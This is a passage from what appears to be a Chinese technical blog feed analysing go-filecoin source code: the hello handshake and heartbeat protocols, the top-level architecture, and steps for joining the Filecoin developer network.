    <content type="text"><![CDATA[我是先河系统CTO杨尉，欢迎大加关注的的Github: waynewyang，本文是filecoin技术架构分析系列文章第六章filecoin源码协议层分析之hello握手协议. 目的 处理节点上线后的区块同步握手。 源码信息 version master分支 619b0eb1（2019年３月２日） package hello location protocol/hello node/node.go 源码分析数据结构 定义协议名称 12// Protocol is the libp2p protocol identifier for the hello protocol.const protocol = &quot;/fil/hello/1.0.0&quot; 定义hello协议消息体结构 TipSet切片 TipSet高度 创世区块cid 123456// Message is the data structure of a single message in the hello protocol.type Message struct &#123; HeaviestTipSetCids []cid.Cid HeaviestTipSetHeight uint64 GenesisHash cid.Cid&#125; 同步回调函数类型定义 1type syncCallback func(from peer.ID, cids []cid.Cid, height uint64) 获取Tipset函数类型定义 1type getTipSetFunc func() types.TipSet Handler结构体,当连接到其他节点的时候，其一,会发送包含本节点信息的hello 消息给对端节点; 其二, 对端也会回复一个包含对端节点信息的消息体过来。 host 对应libp2p上的主机 创世区块cid 区块同步回调函数 获取TipSet的函数 12345678910111213141516// Handler implements the &apos;Hello&apos; protocol handler. Upon connecting to a new// node, we send them a message containing some information about the state of// our chain, and receive the same information from them. This is used to// initiate a chainsync and detect connections to forks.type Handler struct &#123; host host.Host genesis cid.Cid // chainSyncCB is called when new peers tell us about their chain chainSyncCB syncCallback // getHeaviestTipSet is used to retrieve the current heaviest tipset // for filling out our hello messages. getHeaviestTipSet getTipSetFunc&#125; 错误的创世区块 12// ErrBadGenesis is the error returned when a missmatch in genesis blocks happens.var ErrBadGenesis = fmt.Errorf(&quot;bad genesis block&quot;) 以上基本是作为hello客户端的一些定义，以下作为hello服务端的一些定义 12345// New peer connection notificationstype helloNotify Handler// 连接超时时间const helloTimeout = time.Second * 10 方法Handler 方法 流函数处理，接收远端节点的hello消息 12345678910111213141516171819202122232425func (h *Handler) handleNewStream(s net.Stream) &#123; defer s.Close() // nolint: errcheck //获取远端节点实例 from := s.Conn().RemotePeer() var hello Message // 读取流信息到hello结构体中 if err := cbu.NewMsgReader(s).ReadMsg(&amp;hello); err != nil &#123; log.Warningf(&quot;bad hello message from peer %s: %s&quot;, from, err) return &#125; // 调用processHelloMessage方法对接收到的消息进行处理 switch err := h.processHelloMessage(from, &amp;hello); err &#123; // 如果创世区块不一样，关闭流连接退出，不予处理 case ErrBadGenesis: log.Warningf(&quot;genesis cid: %s does not match: %s, disconnecting from peer: %s&quot;, &amp;hello.GenesisHash, h.genesis, from) s.Conn().Close() // nolint: errcheck return case nil: // ok, noop default: log.Error(err) &#125;&#125; 处理hello消息 1234567891011func (h *Handler) processHelloMessage(from peer.ID, msg *Message) error &#123; // 如果创世区块不一样，报错 if !msg.GenesisHash.Equals(h.genesis) &#123; return ErrBadGenesis &#125; // 调用区块同步方法 // 此回调函数实在node包实例化hello协议的时候中定义的 h.chainSyncCB(from, msg.HeaviestTipSetCids, msg.HeaviestTipSetHeight) return nil&#125; 响应远端节点的连接，回复hello消息体 123456789101112131415161718192021222324252627func (h *Handler) getOurHelloMessage() *Message &#123; heaviest := h.getHeaviestTipSet() height, err := heaviest.Height() if err != nil &#123; panic(&quot;somehow heaviest tipset is empty&quot;) &#125; return &amp;Message&#123; GenesisHash: h.genesis, HeaviestTipSetCids: heaviest.ToSortedCidSet().ToSlice(), HeaviestTipSetHeight: height, &#125;&#125;func (h *Handler) sayHello(ctx context.Context, p peer.ID) error &#123; s, err := h.host.NewStream(ctx, p, protocol) if err != nil &#123; return err &#125; defer s.Close() // nolint: errcheck //获取本节点的hello消息体 msg := h.getOurHelloMessage() //向远端节点发送消息体 return cbu.NewMsgWriter(s).WriteMsg(&amp;msg)&#125; helloNotify方法 hello方法，返回一个handler实例 123func (hn *helloNotify) hello() *Handler &#123; return (*Handler)(hn)&#125; helloNotify实现了libp2p-net/interface.go中的Notifiee接口 1234567891011121314151617func (hn *helloNotify) Connected(n net.Network, c net.Conn) &#123; go func() &#123; ctx, cancel := context.WithTimeout(context.Background(), helloTimeout) defer cancel() p := c.RemotePeer() // 有其他节点连接的时候调用sayHello,发送hello消息体 if err := hn.hello().sayHello(ctx, p); err != nil &#123; log.Warningf(&quot;failed to send hello handshake to peer %s: %s&quot;, p, err) &#125; &#125;()&#125;func (hn *helloNotify) Listen(n net.Network, a ma.Multiaddr) &#123;&#125;func (hn *helloNotify) ListenClose(n net.Network, a ma.Multiaddr) &#123;&#125;func (hn *helloNotify) Disconnected(n net.Network, c net.Conn) &#123;&#125;func (hn *helloNotify) OpenedStream(n net.Network, s net.Stream) &#123;&#125;func (hn *helloNotify) ClosedStream(n net.Network, s net.Stream) &#123;&#125; 函数 创建hello实例 12345678910111213141516171819202122232425262728293031323334353637// New creates a new instance of the hello protocol and registers it to// the given host, with the provided callbacks.func New(h host.Host, gen cid.Cid, syncCallback syncCallback, getHeaviestTipSet getTipSetFunc) *Handler &#123; hello := &amp;Handler&#123; host: h, genesis: gen, chainSyncCB: syncCallback, getHeaviestTipSet: getHeaviestTipSet, &#125; //设置流处理回调函数 h.SetStreamHandler(protocol, hello.handleNewStream) //注册网络状态改变通知回调函数 // register for connection notifications h.Network().Notify((*helloNotify)(hello)) return hello&#125;//上文中的helloNotify 实现了libp2p-net/interface.go中的Notifiee接口// Notifiee is an interface for an object wishing to receive// notifications from a Network.type Notifiee interface &#123; Listen(Network, ma.Multiaddr) // called when network starts listening on an addr ListenClose(Network, ma.Multiaddr) // called when network stops listening on an addr Connected(Network, Conn) // called when a connection opened Disconnected(Network, Conn) // called when a connection closed OpenedStream(Network, Stream) // called when a stream opened ClosedStream(Network, Stream) // called when a stream closed // TODO // PeerConnected(Network, peer.ID) // called when a peer connected // PeerDisconnected(Network, peer.ID) // called when a peer disconnected&#125; 实例化及业务逻辑 location: node/node.go Node节点中定义了hello服务 123456type Node struct &#123; ...... HelloSvc *hello.Handler ......&#125; 启动hello服务 123456789101112131415161718192021// Start boots up the node.func (node *Node) Start(ctx context.Context) error &#123; ...... // Start up &apos;hello&apos; handshake service // 定义区块同步的回调函数 syncCallBack := func(pid libp2ppeer.ID, cids []cid.Cid, height uint64) &#123; // TODO it is possible the syncer interface should be modified to // make use of the additional context not used here (from addr + height). // To keep things simple for now this info is not used. // 触发调用会启动同步区块的动作 err := node.Syncer.HandleNewBlocks(context.Background(), cids) if err != nil &#123; log.Infof(&quot;error handling blocks: %s&quot;, types.NewSortedCidSet(cids...).String()) &#125; &#125; //实例化hello服务 node.HelloSvc = hello.New(node.Host(), node.ChainReader.GenesisCid(), syncCallBack, node.ChainReader.Head) ......&#125; 深入浅出区块链 - 系统学习区块链，打造最好的区块链技术博客]]></content>
      <categories>
        <category>FileCoin</category>
      </categories>
      <tags>
        <tag>FileCoin</tag>
        <tag>源码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[filecoin技术架构分析五:filecoin源码分析之协议层心跳协议]]></title>
    <url>%2F2019%2F03%2F04%2Ffilecoin-code-analysis-5%2F</url>
    <content type="text"><![CDATA[我是先河系统CTO杨尉，欢迎大加关注的的Github: waynewyang，本文是filecoin技术架构分析系列文章第五章filecoin源码分析之协议层心跳协议。 源码信息 version master分支 619b0eb1（2019年３月２日） package metrics location metrics/heartbeat.go node/node.go 源码分析数据结构 定义心跳协议名称以及连接超时时间 123456// HeartbeatProtocol is the libp2p protocol used for the heartbeat serviceconst ( HeartbeatProtocol = &quot;fil/heartbeat/1.0.0&quot; // Minutes to wait before logging connection failure at ERROR level connectionFailureErrorLogPeriodMinutes = 10 * time.Minute) 定义心跳信息结构 节点的区块头 节点的区块高度 节点的昵称 是否在区块同步中（ＴＯＤＯ） 矿工地址（如果没有挖矿，这里为零地址） 1234567891011121314151617// Heartbeat contains the information required to determine the current state of a node.// Heartbeats are used for aggregating information about nodes in a log aggregator// to support alerting and devnet visualization.type Heartbeat struct &#123; // Head represents the heaviest tipset the nodes is mining on Head string // Height represents the current height of the Tipset Height uint64 // Nickname is the nickname given to the filecoin node by the user Nickname string // TODO: add when implemented // Syncing is `true` iff the node is currently syncing its chain with the network. // Syncing bool // Address of this node&apos;s active miner. Can be empty - will return the zero address MinerAddress address.Address&#125; 心跳服务结构体 主机结构体：对应libp2p主机 心跳配置 区块头获取 挖矿地址获取 stream锁 stream 1234567891011121314// HeartbeatService is responsible for sending heartbeats.type HeartbeatService struct &#123; Host host.Host Config *config.HeartbeatConfig // A function that returns the heaviest tipset HeadGetter func() types.TipSet // A function that returns the miner&apos;s address MinerAddressGetter func() address.Address streamMu sync.Mutex stream net.Stream&#125; 定义心跳服务Option函数 函数入参为心跳服务结构体,主要用于对心跳服务结构体传参或者解析12// HeartbeatServiceOption is the type of the heartbeat service&apos;s functional options.type HeartbeatServiceOption func(service *HeartbeatService) 方法 获取心跳服务的stream实例 1234567// Stream returns the HeartbeatService stream. Safe for concurrent access.// Stream is a libp2p connection that heartbeat messages are sent over to an aggregator.func (hbs *HeartbeatService) Stream() net.Stream &#123; hbs.streamMu.Lock() defer hbs.streamMu.Unlock() return hbs.stream&#125; 设置心跳服务的stream实例 123456// SetStream sets the stream on the HeartbeatService. Safe for concurrent access.func (hbs *HeartbeatService) SetStream(s net.Stream) &#123; hbs.streamMu.Lock() defer hbs.streamMu.Unlock() hbs.stream = s&#125; 定时确认连接性，并调用运行心跳服务 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657// Start starts the heartbeat service by, starting the connection loop. The connection// loop will attempt to connected to the aggregator service, once a successful// connection is made with the aggregator service hearbeats will be sent to it.// If the connection is broken the heartbeat service will attempt to reconnect via// the connection loop. Start will not return until context `ctx` is &apos;Done&apos;.func (hbs *HeartbeatService) Start(ctx context.Context) &#123; log.Debug(&quot;starting heartbeat service&quot;) rd, err := time.ParseDuration(hbs.Config.ReconnectPeriod) if err != nil &#123; log.Errorf(&quot;invalid heartbeat reconnectPeriod: %s&quot;, err) return &#125; //启动重连定时器 reconTicker := time.NewTicker(rd) defer reconTicker.Stop() // Timestamp of the first connection failure since the last successful connection. // Zero initially and while connected. var failedAt time.Time // Timestamp of the last ERROR log (or of failure, before the first ERROR log). var erroredAt time.Time for &#123; select &#123; case &lt;-ctx.Done(): return case &lt;-reconTicker.C: //重连定时周期到，重新连接 if err := hbs.Connect(ctx); err != nil &#123; // Logs once as a warning immediately on failure, then as error every 10 minutes. now := time.Now() logfn := log.Debugf if failedAt.IsZero() &#123; // First failure since connection failedAt = now erroredAt = failedAt // Start the timer on raising to ERROR level logfn = log.Warningf &#125; else if now.Sub(erroredAt) &gt; connectionFailureErrorLogPeriodMinutes &#123; logfn = log.Errorf erroredAt = now // Reset the timer &#125; failureDuration := now.Sub(failedAt) logfn(&quot;Heartbeat service failed to connect for %s: %s&quot;, failureDuration, err) // failed to connect, continue reconnect loop continue &#125; failedAt = time.Time&#123;&#125; // we connected, send heartbeats! // Run will block until it fails to send a heartbeat. //如果连接成功，运行心跳服务 if err := hbs.Run(ctx); err != nil &#123; log.Warning(&quot;disconnecting from aggregator, failed to send heartbeat&quot;) continue &#125; &#125; &#125;&#125; 运行心跳服务 12345678910111213141516171819202122232425262728293031323334// Run is called once the heartbeat service connects to the aggregator. Run// send the actual heartbeat. Run will block until `ctx` is &apos;Done`. An error will// be returned if Run encounters an error when sending the heartbeat and the connection// to the aggregator will be closed.func (hbs *HeartbeatService) Run(ctx context.Context) error &#123; bd, err := time.ParseDuration(hbs.Config.BeatPeriod) if err != nil &#123; log.Errorf(&quot;invalid heartbeat beatPeriod: %s&quot;, err) return err &#125; //启动心跳定时器 beatTicker := time.NewTicker(bd) defer beatTicker.Stop() //通过encoder进行流写入 // TODO use cbor instead of json encoder := json.NewEncoder(hbs.stream) for &#123; select &#123; case &lt;-ctx.Done(): return nil case &lt;-beatTicker.C: //心跳定时周期到，调用Beat方法获取心跳参数 hb := hbs.Beat() //写入流，发起心跳 if err := encoder.Encode(hb); err != nil &#123; //发生错误会关闭流连接 hbs.stream.Conn().Close() // nolint: errcheck return err &#125; &#125; &#125;&#125; 获取心跳参数 1234567891011121314151617// Beat will create a heartbeat.func (hbs *HeartbeatService) Beat() Heartbeat &#123; nick := hbs.Config.Nickname ts := hbs.HeadGetter() tipset := ts.ToSortedCidSet().String() height, err := ts.Height() if err != nil &#123; log.Warningf(&quot;heartbeat service failed to get chain height: %s&quot;, err) &#125; addr := hbs.MinerAddressGetter() return Heartbeat&#123; Head: tipset, Height: height, Nickname: nick, MinerAddress: addr, &#125;&#125; 心跳流连接1234567891011121314151617181920212223242526272829303132333435363738// Connect will connects to `hbs.Config.BeatTarget` or returns an errorfunc (hbs *HeartbeatService) Connect(ctx context.Context) error &#123; log.Debugf(&quot;Heartbeat service attempting to connect, targetAddress: %s&quot;, hbs.Config.BeatTarget) targetMaddr, err := ma.NewMultiaddr(hbs.Config.BeatTarget) if err != nil &#123; return err &#125; pid, err := targetMaddr.ValueForProtocol(ma.P_P2P) if err != nil &#123; return err &#125; peerid, err := peer.IDB58Decode(pid) if err != nil &#123; return err &#125; // Decapsulate the /p2p/&lt;peerID&gt; part from the target // /ip4/&lt;a.b.c.d&gt;/p2p/&lt;peer&gt; becomes /ip4/&lt;a.b.c.d&gt; targetPeerAddr, _ := ma.NewMultiaddr( fmt.Sprintf(&quot;/p2p/%s&quot;, peer.IDB58Encode(peerid))) targetAddr := targetMaddr.Decapsulate(targetPeerAddr) hbs.Host.Peerstore().AddAddr(peerid, targetAddr, pstore.PermanentAddrTTL) // 建立心跳服务流 s, err := hbs.Host.NewStream(ctx, peerid, HeartbeatProtocol) if err != nil &#123; log.Debugf(&quot;failed to open stream, peerID: %s, targetAddr: %s %s&quot;, peerid, targetAddr, err) return err &#125; log.Infof(&quot;successfully to open stream, peerID: %s, targetAddr: %s&quot;, peerid, targetAddr) //设置流函数 hbs.SetStream(s) return nil&#125; 函数 向心跳服务结构体传参,用于设置获取矿工地址函数 123456// WithMinerAddressGetter returns an option that can be used to set the miner address getter.func WithMinerAddressGetter(ag func() address.Address) HeartbeatServiceOption &#123; return func(service *HeartbeatService) &#123; service.MinerAddressGetter = ag &#125;&#125; 获取默认的矿工地址 123func defaultMinerAddressGetter() address.Address &#123; return address.Address&#123;&#125;&#125; 实例化心跳服务,具体的实例化在node包中实现。 12345678910111213141516// NewHeartbeatService returns a HeartbeatServicefunc NewHeartbeatService(h host.Host, hbc *config.HeartbeatConfig, hg func() types.TipSet, options ...HeartbeatServiceOption) *HeartbeatService &#123; srv := &amp;HeartbeatService&#123; Host: h, Config: hbc, HeadGetter: hg, MinerAddressGetter: defaultMinerAddressGetter, &#125; // 设置心跳服务的获取矿工属性,这会覆盖到上面设置的默认矿工地址 for _, option := range options &#123; option(srv) &#125; return srv&#125; 实例化及业务逻辑 主要由node调用,location:node/node.go,主要逻辑如下 在node的启动方法中，调用node.setupHeartbeatServices方法，建立心跳服务 12345678910// Start boots up the node.func (node *Node) Start(ctx context.Context) error &#123; ...... if err := node.setupHeartbeatServices(ctx); err != nil &#123; return errors.Wrap(err, &quot;failed to start heartbeat services&quot;) &#125; return nil&#125; 建立心跳服务,具体见如下注释 1234567891011121314151617181920212223242526272829303132333435func (node *Node) setupHeartbeatServices(ctx context.Context) error &#123; // 设置“矿工地址获取函数” mag := func() address.Address &#123; addr, err := node.miningAddress() // the only error miningAddress() returns is ErrNoMinerAddress. // if there is no configured miner address, simply send a zero // address across the wire. if err != nil &#123; return address.Address&#123;&#125; &#125; return addr &#125; // 存在心跳目标的时候，实例化心跳服务实例 // start the primary heartbeat service if len(node.Repo.Config().Heartbeat.BeatTarget) &gt; 0 &#123; //调用metrics包中的建立心跳服务实例、以及启动心跳服务实例方法 hbs := metrics.NewHeartbeatService(node.Host(), node.Repo.Config().Heartbeat, node.ChainReader.Head, metrics.WithMinerAddressGetter(mag)) go hbs.Start(ctx) &#125; // 确认是否用户有通过环境变量配置额外的心跳告警服务（自定义指向其他节点），根据用户配置的数目，拉起对应的多线程心跳服务。 // check if we want to connect to an alert service. An alerting service is a heartbeat // service that can trigger alerts based on the contents of heatbeats. if alertTarget := os.Getenv(&quot;FIL_HEARTBEAT_ALERTS&quot;); len(alertTarget) &gt; 0 &#123; ahbs := metrics.NewHeartbeatService(node.Host(), &amp;config.HeartbeatConfig&#123; BeatTarget: alertTarget, BeatPeriod: &quot;10s&quot;, ReconnectPeriod: &quot;10s&quot;, Nickname: node.Repo.Config().Heartbeat.Nickname, &#125;, node.ChainReader.Head, metrics.WithMinerAddressGetter(mag)) go ahbs.Start(ctx) &#125; return nil&#125; 深入浅出区块链 - 系统学习区块链，打造最好的区块链技术博客]]></content>
      <categories>
        <category>FileCoin</category>
      </categories>
      <tags>
        <tag>FileCoin</tag>
        <tag>源码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[filecoin技术架构分析四：filecoin源码顶层架构分析]]></title>
    <url>%2F2019%2F02%2F28%2Ffilecoin-code-analysis-4%2F</url>
    <content type="text"><![CDATA[我是先河系统CTO杨尉，欢迎大加关注的的Github: waynewyang，本文是filecoin技术架构分析系列文章第四章filecoin源码顶层架构分析。 题外话——关于竞争力 网络技术的高速发展带领我们进入了知识大爆炸、技术快速跃迁的时代，5G已经开始走向商业落地，网络速率的再次跃迁给我们带来了无限的想象空间，全息投影、即时翻译、远程医疗、人工智能等等会更加成熟落地？路由器在个人家庭中的角色可能会发生变化？IOT万物互联的时代将会真正到来？区块链的TPS提升？高速网络下的云应用、大数据会出现什么新的玩法？ 笔者想说的是，整个世界都在急速变化，在波涛汹涌的竞争浪潮之中，如何保持自己的竞争力。我偶尔会问同事、朋友，你与刚毕业的大学生相比，优势在哪里？ 笔者认为如下两点才是在这个高速时代的真正竞争力，个人如此，公司团队亦如此。 高效的学习能力 高维的思维能力 以上为笔者观点，也欢迎大家探讨。在分析具体架构之前，笔者在4.2.1中分享自己的分析思路，我认为这也许也值得分享。 filecoin源码顶层架构概览及分析思路分析思路 终于进入到源码分析环节了，其实回顾一下前面三章，filecoin的概念及通用语言可以总结为filecoin的本质，分析源码的过程归根接底还是理解设计者的意图，第三章filecoin开发网络的实战使用对于笔者来说也是为了更清晰地对filecoin本质及设计意图进行深入理解。 分析总思路为：抓住本质分析，理解设计者意图 自上而下逐层分析，从抽象到具体 自下而上反向总结，从具体到抽象 分析过程分为三大步骤 第一步，理解filecoin本质及设计目的（前面三章） 第二步，理解filecoin的顶层架构设计（本章），反向加深对filecoin本质的理解 第三步，各层的具体源码分析（后面章节），反向加深对filecoin本质的理解 详细参见下图 在顶层源码中分为go-filecon和rust-fil-proofs。分别为主框架和存储证明部分，本文主要分析go-filecoin源码的顶层框架。 filecoin顶层架构概览架构图12345678910111213141516171819202122232425262728 ┌─────────────────────────────────────┐ │ │ Network │ network (gossipsub, bitswap, etc.) │ | | \/ │ │ |_| /\ └─────▲────────────▲────────────▲─────┘ │ │ │ ┌────────────────────────────┐ ┌─────▼────┐ ┌─────▼─────┐ ┌────▼─────┐ │ │ │ │ │ │ │ │ │ Commands / REST API │Protocols │ Storage │ │ Mining │ │Retrieval │ │ │ │ Protocol │ │ Protocol │ │ Protocol │ └────────────────────────────┘ │ │ │ │ │ │ │ └──────────┘ └───────────┘ └──────────┘ │ │ │ │ │ └──────────┬─┴─────────────┴───────────┐ │ ▼ ▼ ▼ ┌────────────────────────────────┐ ┌───────────────────┬─────────────────┐ Internal │ Core API │ │ Porcelain │ Plumbing │ API │ │ ├───────────────────┘ │ └────────────────────────────────┘ └─────────────────────────────────────┘ │ │ ┌─────────┴────┬──────────────┬──────────────┬─┴────────────┐ ▼ ▼ ▼ ▼ ▼ ┌────────────┐ ┌────────────┐ ┌────────────┐ ┌────────────┐ ┌────────────┐ │ │ │ │ │ │ │ │ │ │ Core │ Message │ │ Chain │ │ Processor │ │ Block │ │ Wallet │ │ Pool │ │ Store │ │ │ │ Service │ │ │ │ │ │ │ │ │ │ │ │ │ └────────────┘ └────────────┘ └────────────┘ └────────────┘ └────────────┘ 官方给出的如上架构概览图是小于实际源码的，但是不影响理解。 官方的spec项目中，有较多文档说明已经滞后于源码，其引用的源码有些已经从go-filecoin源码中消失了，想深入分析的朋友建议可以结合源码和文档同步进行看。 本文后面的章节中，只会简述各个层的设计目的，每一层的具体源码分析，将放到后面章节分享给大家。 IPFS与filecoin在技术架构层面的关系 IPFS与filecoin同样采用IPLD结构，数据结构是互通的，简而言之，在IPFS之上存储的数据，filecoin可以读取。filecoin存储的未密封数据，IPFS也是可以读取的。 IPFS与filecoin网络部分均复用libp2p部分。 filecoin复用了大量IPFS组件，比如CID、IPLD、bitswap等等。 网络层 网络层的实现依赖协议实验室的libp2p项目，如果不熟悉的可以先简单记住如下要点，后面笔者考虑视情况补充IPFS/libp2p的相关分享。 libp2p的网络层实现了节点之间的联通性问题，包括节点发现、NAT穿透、pubsub、relay等。 libp2p的路由层的主要目的，包括节点路由、内容路由、DHT键值存储。 multistream需要理解，filecoin的协议层之协议定义就是基于mulitistream的。 filecoin网络层的目的 处理请求信息、回复响应信息，包括存储订单处理、检索请求处理、区块同步等等。 协议层协议层主要处理应用级的逻辑，状态切换等，具体会通过api层调用具体的core服务进行处理。 hello握手协议 协议名称： /fil/hello/1.0.0 目的： 本节点上线，向其他节点发起hello握手请求，进而进行区块同步。 响应其他新上线的节点hello握手请求，触发其进行区块同步。 存储协议存储矿工 协议名称：/fil/storage/mk/1.0.0、 /fil/storage/qry/1.0.0 目的： 接受客户发起的订单交易请求、查询订单请求，会提交对应处理状态到区块链上（包括清单处理成功或失败；密封成功或者失败等等）。 更新本地的密封或者订单状态。 存储客户 采用上述的/fil/storage/mk/1.0.0、 /fil/storage/qry/1.0.0协议，建立multistream，向矿工发起交易或者查询交易状态。 检索协议检索矿工 协议名称：/fil/retrieval/free/0.0.0 目的： 接受客户的检索请求，并响应处理 注意：目前仅仅支持free检索，白皮书所描述的完整检索功能尚未实现。 检索客户 采用上述的/fil/retrieval/free/0.0.0协议，建立multistream，向矿工发起检索请求。 心跳协议 协议名称：fil/heartbeat/1.0.0 目的： 启动之后向指定节点发起心跳。 如前面3.2.1章节中的设置Nick Name，以及激活极点，都属于心跳协议实现的。 REST/CMD 这个应该不用多解释，提供ｃｍｄ或者ＲＥＳＴ接口供用户操作具体节点。第三章中的开发网络使用基本都是使用的CMD方式。 内部api层node对象 filecoin的node节点是一个上帝对象，从下面Node的结构可以看出，基本贯穿了filecoin的整个业务。 为了解决耦合性问题，尤其是后续轻节点的实现，官方已经开始将原有的api包，往plumbing包以及porcelain包迁移，这样做的目的是让系统具备更好的解耦性，以满足更灵活的需求。 plumbing和 porcelain模式也是借鉴git的思维。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273▼+Node : struct [fields] +AddNewlyMinedBlock : newBlockFunc +BlockSub : ps.Subscription +Blockstore : bstore.Blockstore +Bootstrapper : *filnet.Bootstrapper +ChainReader : chain.ReadStore +Consensus : consensus.Protocol +Exchange : exchange.Interface +HeaviestTipSetCh : chan interface&#123;&#125; +HeaviestTipSetHandled : func() +HelloSvc : *hello.Handler +MessageSub : ps.Subscription +MiningScheduler : mining.Scheduler +MsgPool : *core.MessagePool +OfflineMode : bool +OnlineStore : *hamt.CborIpldStore +PeerHost : host.Host +Ping : *ping.PingService +PorcelainAPI : *porcelain.API +PowerTable : consensus.PowerTableView +Repo : repo.Repo +RetrievalClient : *retrieval.Client +RetrievalMiner : *retrieval.Miner +Router : routing.IpfsRouting +StorageMiner : *storage.Miner +StorageMinerClient : *storage.Client +Syncer : chain.Syncer +Wallet : *wallet.Wallet -blockTime : time.Duration -blockservice : bserv.BlockService -cancelMining : context.CancelFunc -cancelSubscriptionsCtx : context.CancelFunc -cborStore : *hamt.CborIpldStore -host : host.Host -lookup : lookup.PeerLookupService -mining -miningCtx : context.Context -miningDoneWg : *sync.WaitGroup -sectorBuilder : sectorbuilder.SectorBuilder [methods] +BlockHeight() : *types.BlockHeight, error +BlockService() : bserv.BlockService +CborStore() : *hamt.CborIpldStore +ChainReadStore() : chain.ReadStore +CreateMiner(ctx context.Context, accountAddr address.Address, gasPrice types.AttoFIL, gasLimit types.GasUnits, pledge uint64, pid libp2ppeer.ID, collateral *types.AttoFIL) : *address.Address, error +GetBlockTime() : time.Duration +Host() : host.Host +Lookup() : lookup.PeerLookupService +MiningSignerAddress() : address.Address +MiningTimes() : time.Duration, time.Duration +NewAddress() : address.Address, error +SectorBuilder() : sectorbuilder.SectorBuilder +SetBlockTime(blockTime time.Duration) +Start(ctx context.Context) : error +StartMining(ctx context.Context) : error +Stop(ctx context.Context) +StopMining(ctx context.Context) -addNewlyMinedBlock(ctx context.Context, b *types.Block) -cancelSubscriptions() -getLastUsedSectorID(ctx context.Context, minerAddr address.Address) : uint64, error -getMinerActorPubKey() : []byte, error -handleNewHeaviestTipSet(ctx context.Context, head types.TipSet) -handleNewMiningOutput(miningOutCh chan mining.Output) -handleSubscription(ctx context.Context, f pubSubProcessorFunc, fname string, s ps.Subscription, sname string) -isMining() : bool -miningAddress() : address.Address, error -miningOwnerAddress(ctx context.Context, miningAddr address.Address) : address.Address, error -saveMinerConfig(minerAddr address.Address, signerAddr address.Address) : error -setIsMining(isMining bool) -setupMining(ctx context.Context) : error [functions] +New(ctx context.Context, opts ...ConfigOpt) : *Node, error api包 这基本上是早期实现的api接口，对应4.2.2.1中的Core API，严重依赖于Node，耦合性大。现在在逐步迁移。感兴趣可以参照如下源码逐层深入去看。 12345678910111213141516171819package: apilocation: api/api.gotype API interface &#123; Actor() Actor Address() Address Client() Client Daemon() Daemon Dag() Dag ID() ID Log() Log Miner() Miner Mining() Mining Paych() Paych Ping() Ping RetrievalClient() RetrievalClient Swarm() Swarm Version() Version&#125; plumbing和porcelain包 plumbing api简而言之，是实现底层的公共api，其不依赖于Node的实现。 而porcelain api则是在plumbing api之上，更偏应用级的调用，同样不依赖于Node实现。 1源码分别参见go-filecoin目录下，./plumbing和./porcelain。 core服务层 关于核心业务调度以及业务持久化的底层处理基本都在这一层，包含但不限于如下服务。 Message pool 消息池主要保存还未上链的消息。 Chain store 链存储主要持久化链信息，注意同步区块的逻辑是在协议层的hello协议所出发的。 Processor 处理事务消息如何驱动状态转换。 Block service 负责IPLD数据的内容寻址，包括区块链等。 Wallet 钱包管理。 深入浅出区块链 - 系统学习区块链，打造最好的区块链技术博客]]></content>
      <categories>
        <category>FileCoin</category>
      </categories>
      <tags>
        <tag>FileCoin</tag>
        <tag>源码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[filecoin技术架构分析三：filecoin开发网络使用]]></title>
    <url>%2F2019%2F02%2F22%2Ffilecoin-code-analysis-3%2F</url>
    <content type="text"><![CDATA[我是先河系统CTO杨尉，欢迎大加关注的的Github: waynewyang，本文是filecoin技术架构分析系列文章第三章filecoin开发网络使用。 filecoin开发网络使用辅助资源 Filecoin状态: https://stats.kittyhawk.wtf 网络 存储实时价格 FIL/GB/Month 当前存储容量 GB 当前网络利用率 检索平均价格 激活节点以及分布图 存储平均价格曲线 best tipset 存储矿工 存储矿工数量变化曲线 存储矿工共识结果 近30天的矿工top图 检索矿工 平均检索价格 平均检索时间 平均检索容量 FIL指数 流通FIL及抵押FIL变化图 FIL地址总数 FIL总抵押数及对应存储空间 FIL总数上升曲线图 FIL区块奖励下降曲线图 Filecoin区块浏览器： http://user.kittyhawk.wtf:8000 Chain信息 BestBlock信息 Actor合约信息 获取FIL用于抵押或支付：http://user.kittyhawk.wtf:9797 获取mock FIL代币 Dashboard: http://user.kittyhawk.wtf:8010 Network概览，最新区块信息 区块浏览器链接 Genesis File: http://user.kittyhawk.wtf:8020/genesis.car 创始文件，用于初始化filecoin资源 Prometheus Endpoint: http://user.kittyhawk.wtf:9082/metrics 一些技术指标，比如内存、进程、线程等 Connected Nodes PeerID’s: http://user.kittyhawk.wtf:9082/nodes 连接的节点信息 使用接入filecoin开发网络 初始化filecoin资源目录 如果之前有运行过filecoin，想重新开始，需要删除filecoin资源，同时重新初始化是需要重新花时间同步开发网区块信息的。 1rm -rf ~/.filecoin 初始化资源目录，使用–devnet-user表示连接至开发网 123waynewyang:Downloads waynewyang$ go-filecoin init --devnet-user --genesisfile=http://user.kittyhawk.wtf:8020/genesis.carinitializing filecoin node at ~/.filecoinwaynewyang:Downloads waynewyang$ 启动filecoin进程，接入开发网 1234go-filecoin daemon//如果开发者，需要接入nightly devnet，请设置环境变量后启动filecoinenv FIL_USE_SMALL_SECTORS=true go-filecoin daemon 检查连接性 go-filecoin swarm peers 查看已经连接的节点 1234567891011waynewyang:filecoin waynewyang$ go-filecoin swarm 